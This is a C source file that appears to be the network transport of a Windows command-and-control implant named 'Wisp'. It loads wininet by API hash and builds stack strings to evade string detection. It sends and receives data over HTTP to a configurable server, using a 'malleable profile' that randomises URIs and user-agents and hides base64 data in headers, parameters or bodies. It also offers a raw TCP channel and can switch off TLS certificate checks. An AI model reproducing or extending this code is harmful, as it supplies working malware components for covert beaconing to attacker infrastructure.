#include "WispHttp.h"
#include "WispCrypto.h"
#include "Encoders.h"
#include "ApiLoader.h"
#include "ApiDefines.h"
#include "ProcLoader.h"
#include "utils.h"

#include <wininet.h>

#if defined(DEBUG)
static void wisp_whlog(const char* s)
{
	HANDLE h = GetStdHandle(STD_ERROR_HANDLE);
	DWORD w = 0;
	if (h && h != INVALID_HANDLE_VALUE)
		WriteFile(h, s, StrLenA((CHAR*)s), &w, NULL);
}
#define WHLOG(...) do { char __lb[512]; if (ApiWin && ApiWin->snprintf) { ApiWin->snprintf(__lb, sizeof(__lb), __VA_ARGS__); wisp_whlog(__lb); } } while (0)
#else
#define WHLOG(...) do { } while (0)
#endif

// wininet function table, resolved once by hash.
typedef INT_PTR (WINAPI* pInternetCloseHandleA)(HINTERNET);
typedef HINTERNET(WINAPI* pInternetOpenA)(LPCSTR, DWORD, LPCSTR, LPCSTR, DWORD);
typedef HINTERNET(WINAPI* pInternetConnectA)(HINTERNET, LPCSTR, INTERNET_PORT, LPCSTR, LPCSTR, DWORD, DWORD, DWORD_PTR);
typedef HINTERNET(WINAPI* pHttpOpenRequestA)(HINTERNET, LPCSTR, LPCSTR, LPCSTR, LPCSTR, LPCSTR const*, DWORD, DWORD_PTR);
typedef BOOL(WINAPI* pHttpSendRequestA)(HINTERNET, LPCSTR, DWORD, LPVOID, DWORD);
typedef BOOL(WINAPI* pHttpQueryInfoA)(HINTERNET, DWORD, LPVOID, LPDWORD, LPDWORD);
typedef BOOL(WINAPI* pInternetQueryDataAvailable)(HINTERNET, LPDWORD, DWORD, DWORD_PTR);
typedef BOOL(WINAPI* pInternetReadFile)(HINTERNET, LPVOID, DWORD, LPDWORD);
typedef BOOL(WINAPI* pInternetSetOptionA)(HINTERNET, DWORD, LPVOID, DWORD);
typedef BOOL(WINAPI* pInternetQueryOptionA)(HINTERNET, DWORD, LPVOID, LPDWORD);

struct WispWininet
{
	HMODULE mod;
	pInternetCloseHandleA       close;
	pInternetOpenA              open;
	pInternetConnectA           connect;
	pHttpOpenRequestA           openReq;
	pHttpSendRequestA           send;
	pHttpQueryInfoA             queryInfo;
	pInternetQueryDataAvailable dataAvail;
	pInternetReadFile           readFile;
	pInternetSetOptionA         setOpt;
	pInternetQueryOptionA       queryOpt;
};

static WispWininet g_wininet = { 0 };
static BOOL g_wininetTried = FALSE;

static BOOL WispWininetLoad()
{
	if (g_wininetTried)
		return g_wininet.mod != NULL;
	g_wininetTried = TRUE;

	CHAR name[12];
	name[0] = 'w'; name[1] = 'i'; name[2] = 'n'; name[3] = 'i'; name[4] = 'n';
	name[5] = 'e'; name[6] = 't'; name[7] = '.'; name[8] = 'd'; name[9] = 'l'; name[10] = 'l'; name[11] = 0;
	HMODULE h = ApiWin->LoadLibraryA(name);
	if (!h) {
		WHLOG("[http] LoadLibraryA(wininet) failed\n");
		return FALSE;
	}
	g_wininet.mod = h;
	g_wininet.close     = (pInternetCloseHandleA)GetSymbolAddress(h, HASH_FUNC_INTERNETCLOSEHANDLE);
	g_wininet.open      = (pInternetOpenA)GetSymbolAddress(h, HASH_FUNC_INTERNETOPENA);
	g_wininet.connect   = (pInternetConnectA)GetSymbolAddress(h, HASH_FUNC_INTERNETCONNECTA);
	g_wininet.openReq   = (pHttpOpenRequestA)GetSymbolAddress(h, HASH_FUNC_HTTPOPENREQUESTA);
	g_wininet.send      = (pHttpSendRequestA)GetSymbolAddress(h, HASH_FUNC_HTTPSENDREQUESTA);
	g_wininet.queryInfo = (pHttpQueryInfoA)GetSymbolAddress(h, HASH_FUNC_HTTPQUERYINFOA);
	g_wininet.dataAvail = (pInternetQueryDataAvailable)GetSymbolAddress(h, HASH_FUNC_INTERNETQUERYDATAAVAILABLE);
	g_wininet.readFile  = (pInternetReadFile)GetSymbolAddress(h, HASH_FUNC_INTERNETREADFILE);
	g_wininet.setOpt    = (pInternetSetOptionA)GetSymbolAddress(h, HASH_FUNC_INTERNETSETOPTIONA);
	g_wininet.queryOpt  = (pInternetQueryOptionA)GetSymbolAddress(h, HASH_FUNC_INTERNETQUERYOPTIONA);
	if (!g_wininet.close)     WHLOG("[http] miss close\n");
	if (!g_wininet.open)      WHLOG("[http] miss open\n");
	if (!g_wininet.connect)   WHLOG("[http] miss connect\n");
	if (!g_wininet.openReq)   WHLOG("[http] miss openReq\n");
	if (!g_wininet.send)      WHLOG("[http] miss send\n");
	if (!g_wininet.queryInfo) WHLOG("[http] miss queryInfo\n");
	if (!g_wininet.dataAvail) WHLOG("[http] miss dataAvail\n");
	if (!g_wininet.readFile)  WHLOG("[http] miss readFile\n");
	return g_wininet.close && g_wininet.open && g_wininet.connect && g_wininet.openReq &&
		g_wininet.send && g_wininet.queryInfo && g_wininet.dataAvail && g_wininet.readFile;
}

// split "http://host:port" into host/port (defaults 80/443 by scheme)
static BOOL WispParseServer(const char* server, char* host, ULONG hostCap, WORD* port, BOOL* tls)
{
	const char* p = server;
	BOOL ssl = FALSE;
	if (StrNCmpA((CHAR*)p, (CHAR*)"http://", 7) == 0)
		p += 7;
	else if (StrNCmpA((CHAR*)p, (CHAR*)"https://", 8) == 0) {
		p += 8;
		ssl = TRUE;
	}
	else {
		return FALSE;
	}
	const char* colon = NULL;
	const char* end2 = p + StrLenA((CHAR*)p);
	for (const char* q = p; q < end2; q++) {
		if (*q == ':') {
			colon = q;
			end2 = q; // host ends at the colon
			break;
		}
		if (*q == '/') {
			end2 = q; // host ends at the path
			break;
		}
	}
	ULONG n = (ULONG)(end2 - p);
	if (n == 0 || n >= hostCap)
		return FALSE;
	memcpy(host, p, n);
	host[n] = 0;
	WORD portv = ssl ? 443 : 80;
	if (colon) {
		portv = 0;
		const char* portEnd = p + StrLenA((CHAR*)p);
		for (const char* q = colon + 1; q < portEnd; q++) {
			if (*q < '0' || *q > '9')
				break;
			portv = (WORD)(portv * 10 + (*q - '0'));
		}
		if (portv == 0)
			return FALSE;
	}
	*port = portv;
	*tls = ssl;
	return TRUE;
}

void WispHttpRespFree(WispHttpResp* r)
{
	if (r->body) {
		MemFreeLocal((LPVOID*)&r->body, r->len);
	}
	memset(r, 0, sizeof(*r));
}

BOOL WispHttpPost(const char* server, const BYTE* data, ULONG len, BOOL insecure, WispHttpResp* out)
{
	memset(out, 0, sizeof(*out));
	if (!WispWininetLoad())
		return FALSE;

	char host[256];
	WORD port = 80;
	BOOL tls = FALSE;
	if (!WispParseServer(server, host, sizeof(host), &port, &tls))
		return FALSE;
	WHLOG("[http] host=%s port=%u tls=%u\n", host, port, tls);

	BOOL ok = FALSE;
	HINTERNET hInet = NULL, hConn = NULL, hReq = NULL;

	WHLOG("[http] POST %s\n", server);
	CHAR ua[8];
	ua[0] = 'W'; ua[1] = 'i'; ua[2] = 's'; ua[3] = 'p'; ua[4] = 'p'; ua[5] = 0;
	hInet = g_wininet.open(ua, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
	if (!hInet) {
		WHLOG("[http] InternetOpenA failed gle=%u\n", ApiWin->GetLastError());
		return FALSE;
	}
	hConn = g_wininet.connect(hInet, host, port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
	if (!hConn) {
		WHLOG("[http] InternetConnectA failed gle=%u\n", ApiWin->GetLastError());
		goto done;
	}

	{
		CHAR verb[5];
		verb[0] = 'P'; verb[1] = 'O'; verb[2] = 'S'; verb[3] = 'T'; verb[4] = 0;
		CHAR path[8];
		path[0] = '/'; path[1] = 's'; path[2] = 'u'; path[3] = 'b'; path[4] = 'm'; path[5] = 'i'; path[6] = 't'; path[7] = 0;
		CHAR accept[4] = { '*', '/', '*', 0 };
		LPCSTR accepts[2] = { accept, NULL };
		DWORD flags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE |
			INTERNET_FLAG_KEEP_CONNECTION | INTERNET_FLAG_NO_UI | INTERNET_FLAG_NO_COOKIES;
		if (tls)
			flags |= INTERNET_FLAG_SECURE;
		hReq = g_wininet.openReq(hConn, verb, path, NULL, NULL, accepts, flags, 0);
		if (!hReq) {
			WHLOG("[http] HttpOpenRequestA failed gle=%u\n", ApiWin->GetLastError());
			goto done;
		}
		if (tls && insecure) {
			DWORD secFlags = 0;
			DWORD sz = sizeof(secFlags);
			if (g_wininet.queryOpt(hReq, INTERNET_OPTION_SECURITY_FLAGS, &secFlags, &sz))
				secFlags |= SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
					SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_REVOCATION;
			else
				secFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
					SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_REVOCATION;
			g_wininet.setOpt(hReq, INTERNET_OPTION_SECURITY_FLAGS, &secFlags, sizeof(secFlags));
		}
		if (!g_wininet.send(hReq, NULL, 0, (LPVOID)data, len)) {
			WHLOG("[http] HttpSendRequestA failed gle=%u\n", ApiWin->GetLastError());
			goto done;
		}
		WHLOG("[http] sent %u bytes\n", len);

		CHAR statusTxt[16] = { 0 };
		DWORD statusLen = sizeof(statusTxt) - 1;
		if (!g_wininet.queryInfo(hReq, HTTP_QUERY_STATUS_CODE, statusTxt, &statusLen, NULL))
			goto done;
		int status = 0;
		for (CHAR* q = statusTxt; *q >= '0' && *q <= '9'; q++)
			status = status * 10 + (*q - '0');
		out->status = (DWORD)status;

		// read the whole body
		ULONG cap = 4096, have = 0;
		BYTE* body = (BYTE*)MemAllocLocal(cap);
		if (!body)
			goto done;
		BOOL readOk = TRUE;
		for (;;) {
			DWORD avail = 0;
			if (!g_wininet.dataAvail(hReq, &avail, 0, 0)) {
				readOk = FALSE;
				break;
			}
			if (avail == 0)
				break;
			if (have + avail > cap) {
				ULONG nc = cap;
				while (have + avail > nc)
					nc *= 2;
				// alloc-copy-free (LocalReAlloc movable-handle hazard)
				BYTE* nb = (BYTE*)MemAllocLocal(nc);
				if (!nb) {
					MemFreeLocal((LPVOID*)&body, cap);
					readOk = FALSE;
					break;
				}
				memcpy(nb, body, have);
				memset(body, 0, cap);
				MemFreeLocal((LPVOID*)&body, cap);
				body = nb;
				cap = nc;
			}
			DWORD got = 0;
			if (!g_wininet.readFile(hReq, body + have, avail, &got) || got == 0)
				break;
			have += got;
			if (have > (8 << 20))
				break;
		}
		if (readOk) {
			out->body = body;
			out->len = have;
			ok = TRUE;
		}
		else if (body) {
			MemFreeLocal((LPVOID*)&body, cap);
		}
	}

done:
	if (hReq) g_wininet.close(hReq);
	if (hConn) g_wininet.close(hConn);
	if (hInet) g_wininet.close(hInet);
	return ok;
}
//////// Type1 transport: HTTP malleable profile + raw TCP ////////

static void wx_hex(const BYTE* in, ULONG n, char* out)
{
	static const char* d = "0123456789abcdef";
	ULONG i;
	for (i = 0; i < n; i++) {
		out[i * 2] = d[in[i] >> 4];
		out[i * 2 + 1] = d[in[i] & 15];
	}
	out[n * 2] = 0;
}

static ULONG wx_unix_now(void)
{
	FILETIME ft;
	ULONG64 t;
	ApiWin->GetSystemTimeAsFileTime(&ft);
	t = ((ULONG64)ft.dwHighDateTime << 32) | ft.dwLowDateTime;
	return (ULONG)((t - 116444736000000000ULL) / 10000000ULL);
}

static void wx_append_u32(char* out, ULONG cap, ULONG* pos, ULONG v)
{
	char tmp[16];
	int n = 0;
	do { tmp[n++] = (char)('0' + (v % 10)); v /= 10; } while (v && n < 15);
	while (n && *pos + 1 < cap) out[(*pos)++] = tmp[--n];
}

static void wx_pick_uri(const WispProfile* p, char* out, ULONG cap)
{
	const char* tmpl;
	ULONG i, o = 0;
	ULONG idx;
	if (!out || !cap) return;
	out[0] = 0;
	if (!p->uriCount) return;
	idx = GenerateRandom32() % p->uriCount;
	tmpl = p->uris[idx];
	for (i = 0; tmpl[i] && o + 1 < cap; ) {
		if (StrNCmpA((CHAR*)tmpl + i, (CHAR*)"{uuid}", 6) == 0) {
			BYTE r[8];
			char hx[17];
			WispRandom(r, 8);
			wx_hex(r, 8, hx);
			for (int k = 0; hx[k] && o + 1 < cap; k++) out[o++] = hx[k];
			i += 6;
		}
		else if (StrNCmpA((CHAR*)tmpl + i, (CHAR*)"{ts}", 4) == 0) {
			wx_append_u32(out, cap, &o, wx_unix_now());
			i += 4;
		}
		else if (StrNCmpA((CHAR*)tmpl + i, (CHAR*)"{n}", 3) == 0) {
			wx_append_u32(out, cap, &o, GenerateRandom32() & 0x3FFFFFFF);
			i += 3;
		}
		else {
			out[o++] = tmpl[i++];
		}
	}
	out[o] = 0;
}

static void wx_urlenc(char* out, ULONG cap, ULONG* pos, const char* s)
{
	static const char* hx = "0123456789ABCDEF";
	for (; s && *s && *pos + 4 < cap; s++) {
		unsigned char c = (unsigned char)*s;
		if ((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') ||
			(c >= '0' && c <= '9') || c == '-' || c == '_' || c == '.' || c == '~')
			out[(*pos)++] = (char)c;
		else {
			out[(*pos)++] = '%';
			out[(*pos)++] = hx[c >> 4];
			out[(*pos)++] = hx[c & 15];
		}
	}
}

static BOOL wx_ci_is(const char* a, const char* b)
{
	while (*a && *b) {
		char ca = *a, cb = *b;
		if (ca >= 'A' && ca <= 'Z') ca += 32;
		if (cb >= 'A' && cb <= 'Z') cb += 32;
		if (ca != cb) return FALSE;
		a++; b++;
	}
	return *a == 0 && *b == 0;
}

static BOOL wx_has_header(const WispProfile* p, const char* name)
{
	ULONG i;
	for (i = 0; i < p->headerCount; i++)
		if (wx_ci_is(p->headers[i].key, name)) return TRUE;
	return FALSE;
}

static const char* wx_pick_ua(const WispProfile* p)
{
	if (!p->uaCount) return NULL;
	return p->uaPool[GenerateRandom32() % p->uaCount];
}

static void wx_headers(const WispProfile* p, const char* ua, BOOL body, char* out, ULONG cap, ULONG* len)
{
	ULONG i, o = 0;
	char line[256];
	for (i = 0; i < p->headerCount; i++) {
		ULONG li = 0;
		const char* v = p->headers[i].value;
		const char* k = p->headers[i].key;
		while (*k && li + 2 < sizeof(line)) line[li++] = *k++;
		line[li++] = ':'; line[li++] = ' ';
		while (*v && li + 2 < sizeof(line)) {
			if (v[0] == '{' && StrNCmpA((CHAR*)v, (CHAR*)"{ua}", 4) == 0) {
				const char* u = ua ? ua : "";
				while (*u && li + 2 < sizeof(line)) line[li++] = *u++;
				v += 4;
			}
			else line[li++] = *v++;
		}
		line[li++] = '\r'; line[li++] = '\n';
		for (ULONG z = 0; z < li && o + 1 < cap; z++) out[o++] = line[z];
	}
	if (ua && ua[0] && !wx_has_header(p, "User-Agent")) {
		const char* pre = "User-Agent: ";
		for (ULONG z = 0; pre[z] && o + 1 < cap; z++) out[o++] = pre[z];
		for (ULONG z = 0; ua[z] && o + 1 < cap; z++) out[o++] = ua[z];
		if (o + 2 < cap) { out[o++] = '\r'; out[o++] = '\n'; }
	}
	if (body && !wx_has_header(p, "Content-Type")) {
		const char* pre = "Content-Type: application/octet-stream\r\n";
		for (ULONG z = 0; pre[z] && o + 1 < cap; z++) out[o++] = pre[z];
	}
	out[o] = 0;
	*len = o;
}

static WJVal* wx_parse_response(const WispProfile* p, const BYTE* body, ULONG len)
{
	ULONG i;
	if (!p->respBody[0] || StrCmpA((CHAR*)p->respBody, (CHAR*)"{data}") == 0)
		return WJParse((const char*)body, len);
	for (i = 0; i < len; i++) {
		if (body[i] == '"') {
			ULONG j = i + 1;
			ULONG tlen;
			char* tok;
			ULONG dl;
			BYTE* dec;
			WJVal* v;
			while (j < len && body[j] != '"') j++;
			if (j >= len) break;
			tlen = j - i - 1;
			if (tlen == 0 || tlen > 8 * 1024 * 1024) { i = j; continue; }
			tok = (char*)MemAllocLocal(tlen + 1);
			if (!tok) break;
			memcpy(tok, body + i + 1, tlen);
			tok[tlen] = 0;
			dl = (ULONG)b64_decoded_size(tok);
			dec = (BYTE*)MemAllocLocal(dl + 1);
			if (dec && dl && b64_decode(tok, dec, (int)dl + 1)) {
				v = WJParse((const char*)dec, dl);
				if (v) {
					WJVal* pv = WJObjGet(v, "v");
					if (pv && pv->type == WJ_NUM) {
						MemFreeLocal((LPVOID*)&dec, dl + 1);
						MemFreeLocal((LPVOID*)&tok, tlen + 1);
						return v;
					}
					WJFree(v);
				}
			}
			if (dec) MemFreeLocal((LPVOID*)&dec, dl + 1);
			MemFreeLocal((LPVOID*)&tok, tlen + 1);
			i = j;
		}
	}
	return NULL;
}

static WJVal* wx_http_exchange(const WispConfig* cfg, const char* server, const char* envJson)
{
	char host[256];
	char path[1024];
	char* headers = NULL;
	char* b64 = NULL;
	ULONG b64len = 0;
	ULONG headersLen = 0;
	WORD port = 80;
	BOOL tls = FALSE;
	BOOL ok = FALSE;
	BOOL haveBody = FALSE;
	const char* ua;
	const char* dataSlot = cfg->profile.dataSlot;
	HINTERNET hInet = NULL, hConn = NULL, hReq = NULL;
	BYTE* body = NULL;
	ULONG cap = 4096, have = 0;
	WJVal* out = NULL;
	ULONG i;

	if (!WispWininetLoad())
		return NULL;
	headers = (char*)MemAllocLocal(4096);
	if (!headers)
		return NULL;
	if (!WispParseServer(server, host, sizeof(host), &port, &tls))
		return NULL;

	wx_pick_uri(&cfg->profile, path, sizeof(path));
	ua = wx_pick_ua(&cfg->profile);
	WHLOG("[prof] %s uri=%s slot=%s ua=%s\n", server, path, dataSlot, ua ? ua : "-");
	b64 = b64_encode((const BYTE*)envJson, (int)StrLenA((CHAR*)envJson));
	if (!b64)
		return NULL;
	b64len = StrLenA(b64);

	if (StrNCmpA((CHAR*)dataSlot, (CHAR*)"header:", 7) == 0) {
		const char* name = dataSlot + 7;
		ULONG o = StrLenA((CHAR*)headers);
		(void)o;
		headersLen = 0;
		wx_headers(&cfg->profile, ua, FALSE, headers, 4096, &headersLen);
		{
			ULONG p2 = StrLenA((CHAR*)headers);
			for (i = 0; name[i] && p2 + 1 < 4096; i++) headers[p2++] = name[i];
			if (p2 + 2 < 4096) { headers[p2++] = ':'; headers[p2++] = ' '; }
			for (i = 0; b64[i] && p2 + 1 < 4096; i++) headers[p2++] = b64[i];
			if (p2 + 2 < 4096) { headers[p2++] = '\r'; headers[p2++] = '\n'; }
			headers[p2] = 0;
			headersLen = p2;
		}
	}
	else if (StrNCmpA((CHAR*)dataSlot, (CHAR*)"param:", 6) == 0) {
		const char* name = dataSlot + 6;
		ULONG p2 = StrLenA((CHAR*)path);
		BOOL hasQ = FALSE;
		for (i = 0; path[i]; i++) if (path[i] == '?') hasQ = TRUE;
		if (p2 + 1 < sizeof(path)) path[p2++] = hasQ ? '&' : '?';
		for (i = 0; name[i] && p2 + 1 < sizeof(path); i++) path[p2++] = name[i];
		if (p2 + 1 < sizeof(path)) path[p2++] = '=';
		wx_urlenc(path, sizeof(path), &p2, b64);
		path[p2] = 0;
		wx_headers(&cfg->profile, ua, FALSE, headers, 4096, &headersLen);
	}
	else {
		haveBody = TRUE;
		wx_headers(&cfg->profile, ua, TRUE, headers, 4096, &headersLen);
	}

	hInet = g_wininet.open((LPCSTR)"Wisp", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
	if (!hInet) { WHLOG("[prof] open failed\n"); goto done; }
	hConn = g_wininet.connect(hInet, host, port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
	if (!hConn) { WHLOG("[prof] connect failed gle=%u\n", ApiWin->GetLastError()); goto done; }
	{
		DWORD flags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE |
			INTERNET_FLAG_KEEP_CONNECTION | INTERNET_FLAG_NO_UI | INTERNET_FLAG_NO_COOKIES;
		LPCSTR accepts[2] = { "*/*", NULL };
		if (tls) flags |= INTERNET_FLAG_SECURE;
		hReq = g_wininet.openReq(hConn, (LPCSTR)cfg->profile.method, path, NULL, NULL, accepts, flags, 0);
		if (!hReq) { WHLOG("[prof] openReq failed gle=%u\n", ApiWin->GetLastError()); goto done; }
		if (tls && cfg->insecure) {
			DWORD secFlags = 0;
			DWORD sz = sizeof(secFlags);
			if (g_wininet.queryOpt(hReq, INTERNET_OPTION_SECURITY_FLAGS, &secFlags, &sz))
				secFlags |= SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
					SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_REVOCATION;
			else
				secFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
					SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_REVOCATION;
			g_wininet.setOpt(hReq, INTERNET_OPTION_SECURITY_FLAGS, &secFlags, sizeof(secFlags));
		}
		if (!g_wininet.send(hReq, headersLen ? headers : NULL, headersLen,
			haveBody ? (LPVOID)envJson : NULL, haveBody ? StrLenA((CHAR*)envJson) : 0)) {
			WHLOG("[prof] send failed gle=%u hlen=%u\n", ApiWin->GetLastError(), headersLen);
			goto done;
		}
		{
			CHAR statusTxt[16] = { 0 };
			DWORD statusLen = sizeof(statusTxt) - 1;
			DWORD status = 0;
			if (!g_wininet.queryInfo(hReq, HTTP_QUERY_STATUS_CODE, statusTxt, &statusLen, NULL))
				goto done;
			for (i = 0; statusTxt[i] >= '0' && statusTxt[i] <= '9'; i++)
				status = status * 10 + (statusTxt[i] - '0');
			WHLOG("[prof] status=%u\n", status);
			if (status == 404)
				goto done;
		}
		body = (BYTE*)MemAllocLocal(cap);
		if (!body)
			goto done;
		for (;;) {
			DWORD avail = 0, got = 0;
			if (!g_wininet.dataAvail(hReq, &avail, 0, 0))
				goto done;
			if (avail == 0)
				break;
			if (have + avail > cap) {
				ULONG nc = cap;
				BYTE* nb;
				while (have + avail > nc) nc *= 2;
				nb = (BYTE*)MemAllocLocal(nc);
				if (!nb) goto done;
				memcpy(nb, body, have);
				MemFreeLocal((LPVOID*)&body, cap);
				body = nb;
				cap = nc;
			}
			if (!g_wininet.readFile(hReq, body + have, avail, &got) || got == 0)
				break;
			have += got;
			if (have > (8 << 20))
				break;
		}
		WHLOG("[prof] body=%u\n", have);
		if (have)
			out = wx_parse_response(&cfg->profile, body, have);
		ok = out != NULL;
	}

done:
	(void)ok;
	if (body) MemFreeLocal((LPVOID*)&body, cap);
	if (hReq) g_wininet.close(hReq);
	if (hConn) g_wininet.close(hConn);
	if (hInet) g_wininet.close(hInet);
	if (b64) { ULONG n = StrLenA(b64); MemFreeLocal((LPVOID*)&b64, n + 1); }
	if (headers) MemFreeLocal((LPVOID*)&headers, 4096);
	return out;
}

static BOOL wx_send_all(SOCKET s, const BYTE* d, ULONG n)
{
	ULONG off = 0;
	while (off < n) {
		int r = ApiWin->send(s, (const char*)d + off, (int)(n - off), 0);
		if (r <= 0) return FALSE;
		off += (ULONG)r;
	}
	return TRUE;
}

static BOOL wx_recv_all(SOCKET s, BYTE* d, ULONG n)
{
	ULONG off = 0;
	while (off < n) {
		int r = ApiWin->recv(s, (char*)d + off, (int)(n - off), 0);
		if (r <= 0) return FALSE;
		off += (ULONG)r;
	}
	return TRUE;
}

static SOCKET wx_tcp_connect(const char* server)
{
	static BOOL wsaStarted = FALSE;
	const char* p = server;
	if (!wsaStarted) {
		WSADATA wsa;
		if (!ApiWin->WSAStartup || ApiWin->WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
			return INVALID_SOCKET;
		wsaStarted = TRUE;
	}
	char host[256];
	const char* colon = NULL;
	const char* q;
	ULONG n, i;
	USHORT port = 0;
	struct sockaddr_in sa;
	SOCKET s;
	if (StrNCmpA((CHAR*)p, (CHAR*)"tcp://", 6) == 0) p += 6;
	for (q = p; *q; q++) if (*q == ':') colon = q;
	if (!colon) return INVALID_SOCKET;
	n = (ULONG)(colon - p);
	if (n == 0 || n >= sizeof(host)) return INVALID_SOCKET;
	for (i = 0; i < n; i++) host[i] = p[i];
	host[n] = 0;
	for (q = colon + 1; *q >= '0' && *q <= '9'; q++) port = (USHORT)(port * 10 + (*q - '0'));
	if (port == 0) return INVALID_SOCKET;
	memset(&sa, 0, sizeof(sa));
	sa.sin_family = AF_INET;
	sa.sin_port = _htons(port);
	{
		ULONG ip = _inet_addr(host);
		if (ip == 0xFFFFFFFF) {
			struct hostent* he = ApiWin->gethostbyname(host);
			if (!he || !he->h_addr_list || !he->h_addr_list[0]) return INVALID_SOCKET;
			memcpy(&sa.sin_addr, he->h_addr_list[0], 4);
		}
		else {
			sa.sin_addr.s_addr = ((ip & 0xFF) << 24) | ((ip & 0xFF00) << 8) | ((ip >> 8) & 0xFF00) | ((ip >> 24) & 0xFF);
		}
	}
	s = ApiWin->socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (s == INVALID_SOCKET) return INVALID_SOCKET;
	if (ApiWin->connect(s, (struct sockaddr*)&sa, sizeof(sa)) != 0) {
		ApiWin->closesocket(s);
		return INVALID_SOCKET;
	}
	{
		DWORD tv = 30000;
		ApiWin->setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv, sizeof(tv));
		ApiWin->setsockopt(s, SOL_SOCKET, SO_SNDTIMEO, (const char*)&tv, sizeof(tv));
	}
	return s;
}

static WJVal* wx_tcp_exchange(const char* server, const char* envJson)
{
	SOCKET s = wx_tcp_connect(server);
	BYTE h[9];
	ULONG len = StrLenA((CHAR*)envJson);
	BYTE* payload;
	WJVal* out = NULL;
	if (s == INVALID_SOCKET) return NULL;
	h[0] = 'W'; h[1] = 'I'; h[2] = 'S'; h[3] = 'P';
	h[4] = (BYTE)len; h[5] = (BYTE)(len >> 8); h[6] = (BYTE)(len >> 16); h[7] = (BYTE)(len >> 24);
	h[8] = 0x09;
	if (!wx_send_all(s, h, 9) || (len && !wx_send_all(s, (const BYTE*)envJson, len)))
		goto done;
	if (!wx_recv_all(s, h, 9)) goto done;
	if (h[0] != 'W' || h[1] != 'I' || h[2] != 'S' || h[3] != 'P' || h[8] != 0x09) goto done;
	len = (ULONG)h[4] | ((ULONG)h[5] << 8) | ((ULONG)h[6] << 16) | ((ULONG)h[7] << 24);
	if (len == 0 || len > 10 * 1024 * 1024) goto done;
	payload = (BYTE*)MemAllocLocal(len);
	if (!payload) goto done;
	if (!wx_recv_all(s, payload, len)) {
		MemFreeLocal((LPVOID*)&payload, len);
		goto done;
	}
	out = WJParse((const char*)payload, len);
	MemFreeLocal((LPVOID*)&payload, len);
done:
	ApiWin->closesocket(s);
	return out;
}

WJVal* WispTransportExchange(const WispConfig* cfg, const char* server, const char* envJson)
{
	if (!cfg || !server || !envJson)
		return NULL;
	if (StrNCmpA((CHAR*)server, (CHAR*)"tcp://", 6) == 0)
		return wx_tcp_exchange(server, envJson);
	if (StrNCmpA((CHAR*)server, (CHAR*)"kcp://", 6) == 0)
		return NULL; // KCP Type1 remains a follow-up
	return wx_http_exchange(cfg, server, envJson);
}